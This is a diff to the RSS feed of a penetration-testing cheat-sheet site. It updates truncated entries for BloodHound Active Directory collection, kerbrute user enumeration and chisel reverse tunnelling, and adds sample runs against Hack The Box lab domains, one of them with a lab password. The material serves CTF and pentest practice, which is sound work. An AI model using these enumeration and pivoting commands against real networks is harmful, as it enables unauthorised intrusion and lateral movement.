@@ -12,21 +12,21 @@
       <link>https://tldrbins.github.io/bloodhound/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/bloodhound/</guid>
-      <description>Info Collection (From Linux) bloodhound-python # With password bloodhound-python -d &amp;lt;DOMAIN&amp;gt; -u &amp;lt;USER&amp;gt; -p &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; -dc &amp;lt;DC&amp;gt; -ns &amp;lt;DC_IP&amp;gt; -c all --zip # With Kerberos sudo ntpdate -s &amp;lt;DC&amp;gt; &amp;amp;&amp;amp; bloodhound-python -u &amp;lt;USER&amp;gt; -k -d &amp;lt;DOMAIN&amp;gt; -dc &amp;lt;DC&amp;gt; -ns &amp;lt;DC_IP&amp;gt; -c all --zip -no-pass --use-ldaps Note: passing &amp;apos;-no-pass&amp;apos; will still ask for password, press enter&#xA;Info Collection (From Windows) SharpHound.exe SharpHound.ps1 .\SharpHound.exe -c all --outputdirectory C:\ProgramData # Import module . .</description>
+      <description>Info Collection (From Linux) bloodhound-python # With password python3 bloodhound.py -d &amp;lt;DOMAIN&amp;gt; -u &amp;lt;USER&amp;gt; -p &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; -dc &amp;lt;DC&amp;gt; -ns &amp;lt;DC_IP&amp;gt; -c all --zip $ python3 bloodhound.py -d rebound.htb -u oorend -p &amp;#39;1GR8t@$$4u&amp;#39; -dc dc01.rebound.htb -ns 10.10.11.231 -c all --zip INFO: Found AD domain: rebound.htb INFO: Getting TGT for user INFO: Connecting to LDAP server: dc01.rebound.htb WARNING: LDAP Authentication is refused because LDAP signing is enabled. Trying to connect over LDAPS instead.</description>
     </item>
     <item>
       <title>Kerberos</title>
       <link>https://tldrbins.github.io/kerberos/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/kerberos/</guid>
-      <description>Users enum kerbrute kerbrute userenum --domain &amp;lt;DOMAIN&amp;gt; --dc &amp;lt;DC&amp;gt; &amp;lt;USERNAMES_FILE&amp;gt; Ref: kerbrute&#xA;Usernames generator username-anarchy ./username-anarchy -i &amp;lt;USERS_FILE&amp;gt; | tee &amp;lt;USERNAMES_FILE&amp;gt; Ref: username-anarchy&#xA;Generate Kerberos ticket (From Linux) Kinit Impacket 1. Set up # Step 0: Installation sudo apt install krb5-user cifs-utils # Step 1: Add domain controller to &amp;#39;/etc/hosts&amp;#39; (Try different order if not work) &amp;lt;TARGET&amp;gt; &amp;lt;DC&amp;gt; &amp;lt;DOMAIN&amp;gt; # Step 2: Add domain controller as a DNS server to &amp;#39;/etc/resolv.</description>
+      <description>Usernames enum kerbrute kerbrute userenum --domain &amp;lt;DOMAIN&amp;gt; --dc &amp;lt;DC&amp;gt; &amp;lt;USERNAMES_FILE&amp;gt; $ kerbrute userenum --domain absolute.htb --dc dc.absolute.htb usernames.txt __ __ __ / /_____ _____/ /_ _______ __/ /____ / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \ / ,&amp;lt; / __/ / / /_/ / / / /_/ / /_/ __/ /_/|_|\___/_/ /_.___/_/ \__,_/\__/\___/ Version: v1.0.3 (9dad6e1) - 09/24/24 - Ronnie Flathers @ropnop 2024/09/24 14:54:41 &amp;gt; Using KDC(s): 2024/09/24 14:54:41 &amp;gt; dc.</description>
     </item>
     <item>
       <title>Network Traffic Pivoting</title>
       <link>https://tldrbins.github.io/network_traffic_privoting/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/network_traffic_privoting/</guid>
-      <description>Tunneling Chisel ssh socat metasploit sliver Start a local chisel Server # In our local Linux machine ./chisel server --reverse --port &amp;lt;LOCAL_PORT&amp;gt; Ports forwarding # In target machine ./chisel client &amp;lt;LOCAL_IP&amp;gt;:&amp;lt;LOCAL_PORT&amp;gt; R:&amp;lt;TARGET_PORT&amp;gt;:127.0.0.1:&amp;lt;TARGET_PORT&amp;gt; # Mutiple ports fowarding, can be different targets in the same subnet ./chisel client &amp;lt;LOCAL_IP&amp;gt;:&amp;lt;LOCAL_PORT&amp;gt; R:8080:172.17.0.2:8080 R:5000:172.17.0.3:5000 Socks5 # In our local Linux machine sudo nano /etc/proxychains4.conf # Add to the end of the file socks5 127.0.0.1 1081 # In target machine .</description>
+      <description>Tunneling Chisel ssh socat metasploit sliver Start a local chisel Server # In our local Linux machine ./chisel server --reverse --port &amp;lt;LOCAL_PORT&amp;gt; $ ./chisel server --reverse --port 8000 2024/09/23 12:27:03 server: Reverse tunnelling enabled 2024/09/23 12:27:03 server: Fingerprint ikFn6iQOOodxIlcDQI4dvFu1pdHgV5UnHRenxUg0eho= 2024/09/23 12:27:03 server: Listening on http://0.0.0.0:8000 Ports forwarding # In target machine ./chisel client &amp;lt;LOCAL_IP&amp;gt;:&amp;lt;LOCAL_PORT&amp;gt; R:&amp;lt;TARGET_PORT&amp;gt;:127.0.0.1:&amp;lt;TARGET_PORT&amp;gt; # Mutiple ports fowarding, can be different targets in the same subnet ./chisel client &amp;lt;LOCAL_IP&amp;gt;:&amp;lt;LOCAL_PORT&amp;gt; R:8080:172.</description>
     </item>
   </channel>
 </rss>
